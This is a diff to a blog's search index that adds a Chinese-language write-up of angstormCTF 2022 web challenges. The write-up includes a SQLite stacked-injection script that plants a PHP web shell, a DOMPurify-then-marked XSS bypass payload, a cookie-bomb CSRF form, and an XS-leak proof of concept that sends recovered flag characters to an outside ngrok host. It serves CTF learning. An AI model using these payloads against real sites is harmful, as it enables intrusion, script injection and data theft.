@@ -4,6 +4,29 @@
   
     
     <entry>
+      <title>angstormCTF 2022</title>
+      <link href="2022/05/05/angstormCTF-2022/"/>
+      <url>2022/05/05/angstormCTF-2022/</url>
+      
+        <content type="html"><![CDATA[<p>  上一次单挑打angstormCTF 已经是一年多以前的事了，当时记得有质量挺不错的前端web题，不过很可惜没能ak。 这次趁着最近比较闲，正好单挑ak掉web题，加上有2道题质量还不错, 这里简单记录下</p><a id="more"></a><p><img src="https://hackmd.summershrimp.com/uploads/upload_4aed0a95834bec3491065ea9e631f0d2.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_4aed0a95834bec3491065ea9e631f0d2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="The-Flash"><a href="#The-Flash" class="headerlink" title="The Flash"></a>The Flash</h2><p>前端js代码加了混淆，显示出的文字是假的flag, 但是正如题目名flash一样，真正的flag似乎会间隔性的一闪而过。所以直接写个定时就好 </p><pre><code class="javascript">setInterval(()=&gt; console.log(flash.textContent), 50)</code></pre><h2 id="Auth-Skip"><a href="#Auth-Skip" class="headerlink" title="Auth Skip"></a>Auth Skip</h2><p>通过无签名的cookie鉴权，所以带上cookie访问</p><h2 id="crumbs"><a href="#crumbs" class="headerlink" title="crumbs"></a>crumbs</h2><p>flag在url为某个uuid的页面。而初始所有页面的uuid值会按链表一样被存储起来回显给我们下一个结点。<br>所以写个脚本跟随内容里的uuid作为url就行。</p><h2 id="Xtra-Salty-Sardines"><a href="#Xtra-Salty-Sardines" class="headerlink" title="Xtra Salty Sardines"></a>Xtra Salty Sardines</h2><p> <code>String.prototype.replace</code>的经典误用。由于<code>replace</code>第一个参数是被设计为传递正则的，那么如果只是传递字符串的话就无法做到把整个字符串里所有匹配的字符全部清掉，而是只清理掉第一次出现的匹配字符。所以<code>&lt;&gt;&#39;&amp;aaa&lt;script&gt;alert(1)&lt;/script&gt;</code>就能直接xss了。</p><h2 id="Art-Gallery"><a href="#Art-Gallery" class="headerlink" title="Art Gallery"></a>Art Gallery</h2><p>给了个任意文件下载。加上题目提示说<code>.git</code>。所以多半是直接把.git拿下来回滚。这个github上随便找一个gitdump的项目改下就好了。最后回滚到初始commit拿到flag.txt</p><h2 id="School-Unblocker"><a href="#School-Unblocker" class="headerlink" title="School Unblocker"></a>School Unblocker</h2><p>  简而言之就是利用<code>node-fetch</code>的重定向来ssrf.此处是一个<code>POST</code> =&gt; <code>POST</code>的场景，参考<a href="https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html" target="_blank" rel="noopener">p牛的文章</a> 用307状态码就可以解决。</p><h2 id="Secure-Vault"><a href="#Secure-Vault" class="headerlink" title="Secure Vault"></a>Secure Vault</h2><p>比较类似UAF的场景。题目提供了注册登录注销等功能以及使用jwt token作为鉴权，即根据token里的id去内存数据库里找对应的用户。但是如果找不到的话则返回<code>{}</code>.而只要用<code>{}.restricted == undefined</code>就能拿到flag.所以注销自己的用户后，用刚刚的token访问下<code>/vault</code>就行了。</p><h2 id="No-Flags"><a href="#No-Flags" class="headerlink" title="No Flags"></a>No Flags</h2><p> 这次所有web题里唯一可以rce的题（划重点）。<br> sqlite数据库的堆叠注入 + php =&gt; web shell</p><pre><code class="python">import requestsurl = &quot;https://no-flags.web.actf.co/&quot;PAYLOAD = &quot;&quot;&quot;flag{begins}&#39;);ATTACH DATABASE &#39;/var/www/html/abyss/test.php&#39; AS byctest;CREATE TABLE byctest.wtf (dataz text);INSERT INTO byctest.wtf (dataz) VALUES (&#39;&lt;?php system(&quot;/printflag&quot;); ?&gt;&#39;);INSERT INTO Flags VALUES (&#39;flag{success&quot;&quot;&quot;resp = requests.post(url, data={    &quot;flag&quot;: PAYLOAD})print(resp.text)resp = requests.get(f&quot;{url}/abyss/test.php&quot;)print(resp.text)</code></pre><h2 id="Cliche"><a href="#Cliche" class="headerlink" title="Cliche"></a>Cliche</h2><p>本题的场景其实很有意思，首先看下代码: </p><pre><code class="html"> ...&lt;title&gt;HackerMD&lt;/title&gt;    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/dompurify@2.3.6/dist/purify.min.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/marked@4.0.14/lib/marked.umd.min.js&quot;&gt;&lt;/script&gt; ...&lt;script&gt;        const qs = new URLSearchParams(location.search);        if (qs.get(&quot;content&quot;)?.length &gt; 0) {            document.body.innerHTML = marked.parse(DOMPurify.sanitize(qs.get(&quot;content&quot;)));        }&lt;/script&gt;</code></pre><p>给了一个裸的dom xss. 不过同时存在Dompurify以及marked, 都是最新版本，最终将用户输入的文字进行markdown 转 html。但是可以注意到，这里<code>marked.parse</code>与<code>DomPurify.sanitize</code>的顺序似乎不太对劲？正常来讲，<code>DOMPurify</code>放到最后一步来对html内容进行处理是比较合理的，既然此处是先用来处理用户输入，必然存在某些绕过手段。</p><p>首先我们来考虑下，如果单纯对<code>marked</code>进行攻击，要如何xss?</p><p>比较典型的markdown xss 的payload构造如<code>[xss](javascript:alert(1))</code>虽然对marked而言是可行的。不过由于需要one click，肯定不会出现在CTF题目中。考虑到这点，加上markdown 本身也支持html, 直接塞一个html code就行</p><pre><code class="javascript">marked.parse(&#39;### 213&lt;img src=x onerror=alert(1)&gt;&#39;)//&#39;&lt;h3 id=&quot;213&quot;&gt;213&lt;img src=x onerror=alert(1)&gt;&lt;/h3&gt;\n&#39;</code></pre><p>但是问题随之而来。 如果像这样塞xss代码的话，前一步的<code>DOMPurify</code>就会先把<code>onerror</code>属性处理掉。功亏一篑。</p><p>考虑到marked 作为一个star数上万的大项目，基本不可能有新的构造xss的方式。而<code>DOMPurify</code>从去年下半年开始也基本就没有出现新的绕过。那么此处大致可以考虑排除依赖的绕过手段。此时很自然可以考虑，有没有办法利用二者的差异性，让最终输出塞进一个带<code>onerror</code>属性的img tag就好了。</p><p>具体地说，有没有这样的情况，使得形如<code>&lt;img src=x on[BLANK]error=alert(1)&gt;</code>的payload首先绕过<code>DOMPurify</code>的检查，并且其中<code>[BKANK]</code>会被marked处理掉，从而实现绕过的目的呢？</p><p>在翻看了一下markdown 的标准后，注意到：</p><p><a href="https://spec.commonmark.org/0.30/#example-174" target="_blank" rel="noopener">https://spec.commonmark.org/0.30/#example-174</a></p><p><img src="https://hackmd.summershrimp.com/uploads/upload_04e2754a0ad87a9c15bd3c2f4d4cb022.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_04e2754a0ad87a9c15bd3c2f4d4cb022.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>可以看到<code>\n&gt;</code>作为blockquote的用法，它会去把所有以其为开头后续的字符放到<code>&lt;blockquote&gt;</code>中包裹。那么这不正好符合我们的需求，即让<code>marked</code>处理掉payload其中部分字符么？</p><p>剩下就只有一个小问题了。<code>DOMPurify</code>处理输入时，往往会把未匹配的<code>&lt;</code>,<code>&gt;</code>,<code>\n</code>等字符进行转义或者清除。所以我们要把这些字符塞进一个不会被转义的地方。放到一个html tag的属性里面即可。</p><pre><code class="javascript">DOMPurify.sanitize(&#39;### 213&lt;img src=&quot;aaa&gt;\n&lt;&gt;&quot; &gt;&#39;)// &#39;### 213&lt;img src=&quot;aaa&gt;\n&lt;&gt;&quot;&gt;&#39;DOMPurify.sanitize(&#39;### 213&lt;img src=&quot;aaa&gt;\n&lt;&gt;&quot; &lt;&gt;&lt;&#39;)&#39;### 213&lt;img src=&quot;aaa&gt;\n&lt;&gt;&quot;&gt;&amp;lt;&#39;</code></pre><p>简单试验下：</p><pre><code class="javascript">marked.parse(&#39;### 213&lt;img src=&quot;\n&gt;&lt;THIS IS ESCAPED&gt;&quot;&#39;)//&#39;&lt;h3 id=&quot;213img-src&quot;&gt;213&amp;lt;img src=&amp;quot;&lt;/h3&gt;\n&lt;blockquote&gt;\n&lt;p&gt;&lt;THIS IS ESCAPED&gt;&amp;quot;&lt;/p&gt;\n&lt;/blockquote&gt;\n&#39;</code></pre><p>最终payload:</p><pre><code class="javascript">marked.parse(DOMPurify.sanitize(&#39;### 123&lt;img src=&quot;a\n&gt;&lt;img src=x onerror=alert(1)&gt;\n&gt;&quot;&gt;&#39;))//&#39;&lt;h3 id=&quot;123img-srca&quot;&gt;123&amp;lt;img src=&amp;quot;a&lt;/h3&gt;\n&lt;blockquote&gt;\n&lt;img src=x onerror=alert(1)&gt;\n&quot;&gt;&lt;/blockquote&gt;\n&#39;</code></pre><p>当然这题还有很多其他做法，感兴趣的可以继续探索下 :)</p><h2 id="Sustenance"><a href="#Sustenance" class="headerlink" title="Sustenance"></a>Sustenance</h2><p>本题的核心代码其实很简单，但是做起来花了好久。。。</p><pre><code class="javascript">const adminSecret = process.env.ADMIN_SECRET || &quot;secretpw&quot;;const flag =    process.env.FLAG ||    &quot;actf{someone_is_going_to_submit_this_out_of_desperation}&quot;;function queryMiddleware(req, res, next) {    res.locals.search =        req.cookies.search || &quot;the quick brown fox jumps over the lazy dog&quot;;    // admin is a cool kid    if (req.cookies.admin === adminSecret) {        res.locals.search = flag;    }    next();}app.use(cookieParser());app.get(&quot;/&quot;, (req, res) =&gt; {    res.sendFile(path.join(__dirname, &quot;index.html&quot;));});app.post(&quot;/s&quot;, (req, res) =&gt; {    if (req.body.search) {        for (const [name, val] of Object.entries(req.body)) {            res.cookie(name, val, { httpOnly: true });        }    }    res.redirect(&quot;/&quot;);});app.get(&quot;/q&quot;, queryMiddleware, (req, res) =&gt; {    const query = req.query.q || &quot;h&quot;; // h    let status;    if (res.locals.search.includes(query)) {        status =            &quot;succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance&quot;;    } else {        status = &quot;failed&quot;;    }    res.redirect(        &quot;/?m=&quot; +            encodeURIComponent(                `your search that took place at ${Date.now()} has ${status}`            )    );});</code></pre><p>可以看到基本就是一个xsleak的场景。但是条件可以说相当苛刻。假如只考虑<code>/q</code>路由的search功能，最终搜索到与未搜索到只有url长度的区别。最终反映到前端上加载的资源也没有变化，用<del>缓存或者用</del><code>performance</code>来探测都不太可行的样子。</p><p>但是注意到此处还剩下一个<code>/s</code>路由, 可以做到通过req.body任意设置cookie 的name与value.那么有什么用呢？这里一开始的想法是，利用任意设置cookie的name,value的场景与我曾经见过的一个场景类似。曾经go的1.15版本左右,用于设置header的函数没有过滤<code>&lt;name-value&gt;</code>键值对中的name,导致前者可控的情况下可以塞入<code>\r\n</code>造成CRLF.不过此处看了下express的实现，是借用正则检查了<code>name</code>并把<code>value</code>用<code>encodeURICompenent()</code>处理了。所以肯定没法CRLF.</p><p>那么设置cookie有什么用呢？我又仔细看了下express的代码，发现倒是可以通过name: <code>ABC=test; SameSite=None; Secure; Path=/; A</code>, value: <code>1</code>的手段，把所设置的cookie的samesite属性改动下。加上我们xsleak 必定是cross-origin的，说明这个手段肯定是有用的，也就是跨域了也能通过非<code>top-level navigation</code>带上自定义的cookie请求.</p><p>如果cookie是这个用处的话，考虑到我们现在需要一种方法来跨域地分辨搜索的结果，那么只能考虑通过<code>Error event</code>来探测了。<br>这个在xsleaks wiki 也有收录  <a href="https://xsleaks.dev/docs/attacks/error-events/" target="_blank" rel="noopener">https://xsleaks.dev/docs/attacks/error-events/</a></p><p>换句话说现在我们要用cookie来触发错误事件。由于<code>/q</code>处搜索结果根据正确与否，url长度是不同的，那么我们是否可以利用cookie来增加请求的长度，使其接近阈值。如果搜到了匹配字符，其更长的url加上cookie的请求会使得页面报错，而未搜到结果的url+cookie 不会导致报错呢？</p><p>经过简单的实验我发现这是可行的，假如cookie够多，配上一定长度的url，会使当前站触发一个413 的状态码。这实际上就是早年就已出现的一种名为cookie bomb的DOS攻击手法。这样我们就有了xsleak的手段了！</p><p>这里首先写一个加cookie的表单</p><pre><code class="html">&lt;!-- csrf.html --&gt;&lt;form action=&quot;https://sustenance.web.actf.co/s&quot; method=&quot;POST&quot; id=&quot;form&quot;&gt;    &lt;input name=&#39;search&#39; value=&#39;test&#39;&gt;    &lt;input id=&quot;A&quot; name=&#39;&#39; value=&#39;1&#39;&gt;&lt;/form&gt;&lt;script&gt;let num = location.search;num = num.substring(1);if (num!=&quot;5&quot;) {    document.getElementById(&quot;A&quot;).name = `${num}=${&quot;A&quot;.repeat(3765)}; SameSite=None; Secure; Path=/; A`;} else {    document.getElementById(&quot;A&quot;).name = `${num}=${&quot;A&quot;.repeat(475)};SameSite=None; Secure; Path=/; A`;}form.submit();&lt;/script&gt;</code></pre><p>由于每次提交的body长度有限，我试了下大概提交5次就可以让cookie长度接近一个阈值了，其中最后一个cookie值可以稍微少一点。</p><p>然而此时我意识到一个问题，我们看下题目获取flag的代码</p><pre><code class="javascript">    if (req.cookies.admin === adminSecret) {        res.locals.search = flag;    }</code></pre><p>也就是说，必须要有admin的cookie才能保证搜的结果是在与flag相匹配。但是假如我们假设admin-bot的cookie配置就是最朴素的<code>admin=xxxxxx</code>的话，其<code>SameSite</code>属性默认是为<code>Lax</code>的。而<code>Lax</code>修饰的cookie只有在发生<code>top-level navigation</code>的情况下才会跨域传递。简单说就是只有当浏览器url输入栏的值发生变化才会跨域传递它，包括但不限于<code>window.open</code>打开页面以及form 表单提交等情况。</p><p>假如我们是使用 xsleak 常规的探测error的方法的话，虽然bot会带上我们先前设置的cookie,但是却没办法带上自己的admin cookie。导致匹配的内容不是flag…….</p><pre><code class="javascript">function probeError(url) {  let script = document.createElement(&#39;script&#39;);  script.src = url;  script.onload = () =&gt; console.log(&#39;Onload event triggered&#39;);  script.onerror = () =&gt; console.log(&#39;Error event triggered&#39;);  document.head.appendChild(script);}// because google.com/404 returns HTTP 404, the script triggers error eventprobeError(&#39;https://sustenance.web.actf.co/q?q=actf&#39;);</code></pre><p>到这一步我卡了快一天左右，因为按照上面的思路，只有<code>window.open(&#39;https://sustenance.web.actf.co/q?q=actf&#39;)</code>的情况才能保证搜的是flag.否则肯定不可行。然而搜了很久也没法找到用window来跨域探测状态的情况。此时便陷入僵局了。</p><p>此时我开始考虑admin的cookie会不会被设置为samesite 为none的情况了。但是这种特殊情况基本不太可能。如果真的是samesite 为Lax的默认情况，想要cookie能够在<code>probeError</code>时被传递，我必须部署自己的html到这个站或者旁站上去。。。。。。</p><p>等下，此时我突然想起之前所做的题目<code>No flags</code>是已经rce的，而那一道题目可以传webshell，即可以部署文件上去。而本题和该题的url分别是：<code>https://sustenance.web.actf.co/</code>, <code>https://no-flags.web.actf.co/</code>。</p><p>我们知道，samesite是比<code>same-origin</code>更弱一点的概念。且samesite 与否看的是<code>registrable Domain</code>的概念。此处可以参考 <a href="https://blog.huli.tw/2022/01/16/same-site-to-same-origin-document-domain/#%E7%B4%B0%E7%A9%B6-same-site。" target="_blank" rel="noopener">https://blog.huli.tw/2022/01/16/same-site-to-same-origin-document-domain/#%E7%B4%B0%E7%A9%B6-same-site。</a>  简而言之，除非是<code>github.io</code>这种被<code>public suffix list</code>收录的域名，否则两个同级的子域名<code>https://sustenance.web.actf.co/</code>, <code>https://no-flags.web.actf.co/</code>肯定是samesite的！</p><p>所以最后我通过把自己的两个poc部署到no-flags的服务器上去，成功拿到了flag 😉.<br>poc.html</p><pre><code class="html">&lt;body&gt;    &lt;iframe src=&quot;https://deelay.me/999999/http://example.com&quot;&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;script&gt;    async function sleep(ms) {        return new Promise(resolve =&gt; setTimeout(resolve, ms));    }    async function search(url) {        return await new Promise((resolve, reject) =&gt; {            let script = document.createElement(&quot;script&quot;);            script.src = url;            script.onload = resolve;            script.onerror = reject;            document.body.appendChild(script);        })    }    async function oracle(url) {        try {            await search(url);            return true;        } catch (err) {            return false;        }    }    async function exploit() {        let windows = []        for (let i = 1; i &lt;= 5; i++) {            temp = window.open(`./csrf.html?${i}`)            await sleep(50);            windows.push(temp)        }        await sleep(3000)        for (let x of windows) {            x.close()        }        let flag = &quot;ctf{yummy_sustenanc&quot;        while (!flag.endsWith(&quot;}&quot;)) {            for (let ch of &quot;{}_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;) {                let url = &quot;https://sustenance.web.actf.co/q?q=a&quot; + flag + ch;                let result = await oracle(url);                if (!result) {                    flag += ch;                    fetch(`https://8a1e-82-157-177-169.ngrok.io/?${encodeURIComponent(flag)}`, { mode: &#39;no-cors&#39; })                    break                }            }        }     }    exploit();&lt;/script&gt;</code></pre><p>csrf.html同上。当然，最后这个部署到其他题目上的做法也不需要给cookie加上<code>samesite=None</code>了，不过不影响解题。</p><p>当然赛后看到Water Paddler 的队友huli有cache probing 的做法，膜一手。<a href="https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722" target="_blank" rel="noopener">https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722</a></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>总的来说，angstormCTF 作为一个面向高中生的CTF真的非常不错。题目质量可以，梯度合理，也有如<code>cliche</code>,<code>Sustenance</code>这种值得花时间去思考的题目。无怪其CTFtime评分这么高了。另外js web题对我而言从各种角度来说都是真的对胃口 :) </p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> WEB </tag>
+            
+            <tag> javascript </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Netty 内存马的一种思路</title>
       <link href="2022/04/05/Netty-%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%B8%80%E7%A7%8D%E6%80%9D%E8%B7%AF/"/>
       <url>2022/04/05/Netty-%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%B8%80%E7%A7%8D%E6%80%9D%E8%B7%AF/</url>
@@ -65,9 +88,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
         </tags>
       
@@ -105,9 +128,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
             <tag> wp </tag>
             
@@ -130,9 +153,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
         </tags>
       
@@ -227,9 +250,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
             <tag> wp </tag>
             
@@ -252,9 +275,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
             <tag> wp </tag>
             
@@ -315,9 +338,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
             <tag> wp </tag>
             
@@ -447,9 +470,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
             <tag> wp </tag>
             
@@ -575,9 +598,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
             <tag> wp </tag>
             
@@ -621,9 +644,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
         </tags>
       
@@ -669,9 +692,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
             <tag> wp </tag>
             
@@ -694,9 +717,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
             <tag> wp </tag>
             
@@ -719,9 +742,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
             <tag> wp </tag>
             
@@ -742,9 +765,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
             <tag> wp </tag>
             
@@ -807,9 +830,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
         </tags>
       
@@ -853,9 +876,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
             <tag> wp </tag>
             
@@ -876,9 +899,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
             <tag> wp </tag>
             
@@ -899,9 +922,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
             <tag> PHP </tag>
             
@@ -1038,9 +1061,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
         </tags>
       
@@ -1080,9 +1103,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
         </tags>
       
@@ -1101,9 +1124,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
             <tag> hackthebox </tag>
             
@@ -1246,9 +1269,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
         </tags>
       
@@ -1267,9 +1290,9 @@
       
         <tags>
             
-            <tag> WEB </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> WEB </tag>
             
         </tags>
       
